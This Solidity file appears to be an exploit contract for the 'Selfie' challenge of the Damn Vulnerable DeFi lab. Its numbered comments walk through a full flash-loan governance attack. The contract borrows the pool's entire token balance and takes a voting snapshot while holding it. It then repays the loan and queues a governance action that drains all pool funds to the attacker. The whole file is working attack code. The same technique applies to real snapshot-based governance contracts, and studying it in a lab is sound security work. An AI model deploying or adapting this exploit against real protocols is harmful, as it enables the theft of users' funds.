// SPDX-License-Identifier: MIT

pragma solidity ^0.8.0;

import "@openzeppelin/contracts/token/ERC20/IERC20.sol";


interface IDamnValuableTokenSnapshot is IERC20 {
    function snapshot() external returns (uint256);
}

interface ISimpleGovernance {
    function queueAction(address receiver, bytes calldata data, uint256 weiAmount) external returns (uint256);
}

interface ISelfiePool {
    function token() external returns (IDamnValuableTokenSnapshot);
    function governance() external returns (ISimpleGovernance);
    function flashLoan(uint256 borrowAmount) external;
    function drainAllFunds(address receiver) external;
}


contract SelfieAttack {
    
    address private immutable attacker;
    uint256 public actionId;
    
    // 1. store attacker address (owner) for later use
    constructor() {
        attacker = msg.sender;
    }
    
    // 2. take out a flash loan of as many DVT tokens as available
    function attack(address selfiePool) external {
        ISelfiePool pool = ISelfiePool(selfiePool);
        uint256 poolBalance = pool.token().balanceOf(selfiePool);
        pool.flashLoan(poolBalance);
    }

    // 3. work with the receicved flash loan
    function receiveTokens(address token, uint256 borrowAmount) external {
        // 4. take a snapshot while owning the DVT tokens
        IDamnValuableTokenSnapshot dvt = IDamnValuableTokenSnapshot(token);
        dvt.snapshot();
        // 5. repay the flash loan
        dvt.transfer(msg.sender, borrowAmount);
        
        // 6. queue a governance action which withdraws all funds to the attacker and store its ID for later execution
        actionId = ISelfiePool(msg.sender).governance().queueAction(msg.sender, abi.encodeWithSelector(ISelfiePool.drainAllFunds.selector, attacker), 0);
    }
}
